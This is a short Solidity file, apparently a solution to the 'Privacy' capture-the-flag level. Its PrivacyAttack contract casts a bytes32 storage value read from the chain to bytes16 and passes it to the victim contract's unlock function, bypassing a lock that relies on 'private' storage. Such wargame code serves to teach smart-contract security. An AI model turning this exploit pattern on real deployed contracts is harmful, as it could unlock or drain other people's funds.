// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Privacy.sol";

contract PrivacyAttack {
    Privacy public victimcontract;
    
    

    constructor(address _victimContractAddress) public {
        victimcontract = Privacy(_victimContractAddress);
    }

    function unlock(bytes32 _slot) public {
       bytes16 key = bytes16(_slot);
       victimcontract.unlock(key);
    }
}